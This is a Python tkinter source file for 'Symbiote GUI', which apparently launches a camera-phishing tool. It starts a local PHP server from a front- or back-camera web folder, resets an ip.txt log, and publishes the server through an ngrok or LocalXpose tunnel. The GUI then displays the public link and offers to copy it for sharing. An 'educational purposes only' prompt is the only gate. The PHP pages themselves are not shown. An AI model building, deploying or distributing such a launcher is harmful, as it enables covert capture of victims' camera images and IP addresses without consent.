import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import subprocess
import os
from time import sleep
import psutil  # For better process management
import check_dep

class SymbioteGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Symbiote GUI")
        self.root.geometry("800x800")
        self.setup_styles()
        
        self.agreement_accepted = False
        self.current_frame = None
        self.active_processes = []
        self.server_running = False
        self.public_url = None  # Variable to store the tunneled URL
        # Run the first-time setup to check dependencies
        check_dep.first_run_setup()  # Will exit if dependencies are not installed
        
        self.show_agreement_screen()

    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TFrame', background='#2e2e2e')
        style.configure('TLabel', background='#2e2e2e', foreground='white')
        style.configure('TRadiobutton', background='#2e2e2e', foreground='white')
        style.configure('TButton', background='#3e3e3e', foreground='white')
        
    def clear_window(self):
        if self.current_frame:
            self.current_frame.destroy()
        
    def show_agreement_screen(self):
        self.clear_window()
        frame = ttk.Frame(self.root)
        frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        lbl = ttk.Label(frame, text="Do you agree to use this tool for educational purposes only?", 
                       wraplength=400)
        lbl.pack(pady=20)
        
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(pady=10)
        
        ttk.Button(btn_frame, text="Agree", command=self.accept_agreement).pack(side=tk.LEFT, padx=10)
        ttk.Button(btn_frame, text="Exit", command=self.root.destroy).pack(side=tk.RIGHT, padx=10)
        
        self.current_frame = frame

    def accept_agreement(self):
        self.agreement_accepted = True
        self.show_main_interface()

    def show_main_interface(self):
        self.clear_window()
        main_frame = ttk.Frame(self.root)
        main_frame.pack(expand=True, fill='both', padx=10, pady=10)
        
        # Configuration Section
        config_frame = ttk.LabelFrame(main_frame, text="Configuration")
        config_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(config_frame, text="Camera Type:").grid(row=0, column=0, padx=5)
        self.camera_var = tk.StringVar(value='front')
        ttk.Radiobutton(config_frame, text="Front", variable=self.camera_var, value='front').grid(row=0, column=1)
        ttk.Radiobutton(config_frame, text="Back", variable=self.camera_var, value='back').grid(row=0, column=2)
        
        ttk.Label(config_frame, text="Port:").grid(row=1, column=0, padx=5)
        self.port_entry = ttk.Entry(config_frame, width=10)
        self.port_entry.insert(0, "8080")
        self.port_entry.grid(row=1, column=1, sticky=tk.W)
        
        # Server Selection
        server_frame = ttk.LabelFrame(main_frame, text="Server Selection")
        server_frame.pack(fill=tk.X, pady=5)
        
        self.server_var = tk.StringVar(value='ngrok')
        servers = [('Ngrok', 'ngrok'), ('LocalXpose', 'localxpose')]
        for i, (text, val) in enumerate(servers):
            ttk.Radiobutton(server_frame, text=text, variable=self.server_var, value=val).grid(row=0, column=i, padx=5)
        
        # Output Console
        console_frame = ttk.LabelFrame(main_frame, text="Output")
        console_frame.pack(expand=True, fill=tk.BOTH, pady=5)
        
        self.console = scrolledtext.ScrolledText(console_frame, bg='#1e1e1e', fg='white')
        self.console.pack(expand=True, fill=tk.BOTH)
        
        # URL Placeholder and Copy Button
        self.url_frame = ttk.Frame(main_frame)
        self.url_frame.pack(fill=tk.X, pady=5)
        
        self.url_label = ttk.Label(self.url_frame, text="Tunneled URL: N/A", foreground='lightblue')
        self.url_label.pack(side=tk.LEFT, padx=10)
        
        self.copy_button = ttk.Button(self.url_frame, text="Copy URL", command=self.copy_url, state=tk.DISABLED)
        self.copy_button.pack(side=tk.RIGHT, padx=10)

        # Control Buttons
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(pady=10)
        
        self.start_btn = ttk.Button(btn_frame, text="Start Server", command=self.start_server)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        self.stop_btn = ttk.Button(btn_frame, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.current_frame = main_frame

    def start_server(self):
        if self.server_running:
            messagebox.showwarning("Warning", "Server is already running!")
            return
            
        port = self.port_entry.get()
        if not self.validate_port(port):
            messagebox.showerror("Error", "Invalid port number! (1-65535)")
            return
        
        server_type = self.server_var.get()
        camera_type = self.camera_var.get()
        
        self.prepare_environment(camera_type, port)
        
        # Disable controls while running
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.server_running = True
        
        # Run server in background thread
        server_thread = threading.Thread(
            target=self.run_server,
            args=(server_type, port, camera_type),
            daemon=True
        )
        server_thread.start()

    def prepare_environment(self, camera_type, port):
        # Clean previous runs
        subprocess.run(f"fuser -k {port}/tcp > /dev/null 2>&1", shell=True)
        
        # Set up camera directory
        self.cam_dir = 'www_f' if camera_type == 'front' else 'www_b'
        subprocess.run(f"rm -rf Server/{self.cam_dir}/ip.txt && touch Server/{self.cam_dir}/ip.txt", shell=True)
        
    def run_server(self, server_type, port, camera_type):
        try:
            # Start PHP server
            php_cmd = f"cd Server/{self.cam_dir}/ && php -S 127.0.0.1:{port}"
            php_process = subprocess.Popen(
                php_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            self.active_processes.append(php_process)
            self.log_output(f"PHP server started on port {port}")
            
            # Start selected tunnel
            if server_type == 'ngrok':
                tunnel_cmd = f"./Server/ngrok http {port}"
            else:  # Only LocalXpose is left
                tunnel_cmd = f"./Server/loclx tunnel http --to {port}"
            
            tunnel_process = subprocess.Popen(
                tunnel_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            self.active_processes.append(tunnel_process)
            self.log_output(f"{server_type.capitalize()} tunnel started")

            # If using Ngrok, fetch the public URL
            if server_type == "ngrok":
                sleep(5)  # Wait for Ngrok to establish tunnel
                try:
                    curl_cmd = "curl -s -N http://127.0.0.1:4040/api/tunnels | grep -oE '\"public_url\":\"https[^\"]+\"' "
                    process = subprocess.Popen(
                        curl_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                    )
                    output, error = process.communicate()

                    if output:
                        start_index = output.find('\"public_url\":\"') + len('\"public_url\":\"')
                        end_index = output.find('\"', start_index)
                        self.public_url = output[start_index:end_index]
                        
                        self.log_output(f"Ngrok Tunnel URL: {self.public_url}")
                        self.update_url_display()
                    else:
                        self.log_output("Ngrok tunnel not found or failed to fetch URL.")
                except Exception as e:
                    self.log_output(f"Error fetching Ngrok URL: {e}")

            # If using LocalXpose, extract the URL from output
            elif server_type == "localxpose":
                # Capture the LocalXpose URL directly from the process output
                while True:
                    output = tunnel_process.stdout.readline()
                    if output:
                        if "loclx.io" in output:
                            # Extract the LocalXpose URL
                            self.public_url = output.split()[4].strip()
                            self.log_output(f"LocalXpose Tunnel URL: {self.public_url}")
                            self.update_url_display()
                            break
                    sleep(0.1)
            
            # Monitor processes for output
            while self.server_running:
                for process in self.active_processes:
                    output = process.stdout.readline()
                    if output:
                        self.log_output(output.strip())
                
                sleep(0.1)
                
        except Exception as e:
            self.log_output(f"Error: {str(e)}")
        finally:
            self.stop_server()

    def stop_server(self):
        self.server_running = False
        for process in self.active_processes:
            try:
                # Kill the process and all its children
                parent = psutil.Process(process.pid)
                for child in parent.children(recursive=True):
                    child.kill()
                parent.kill()
            except psutil.NoSuchProcess:
                self.log_output(f"Process {process.pid} already terminated")
            except Exception as e:
                self.log_output(f"Error killing process: {e}")
        
        self.active_processes = []
        self.log_output("All processes stopped")
        
        # Reset UI controls
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)

    def validate_port(self, port):
        try:
            return 1 <= int(port) <= 65535
        except ValueError:
            return False

    def log_output(self, message):
        self.console.insert(tk.END, message + "\n")
        self.console.see(tk.END)
        self.root.update_idletasks()

    def update_url_display(self):
        if self.public_url:
            self.url_label.config(text=f"Tunneled URL: {self.public_url}")
            self.copy_button.config(state=tk.NORMAL)

    def copy_url(self):
        if self.public_url:
            self.root.clipboard_clear()
            self.root.clipboard_append(self.public_url)
            messagebox.showinfo("Info", "URL copied to clipboard!")

    def on_close(self):
        self.stop_server()
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = SymbioteGUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()
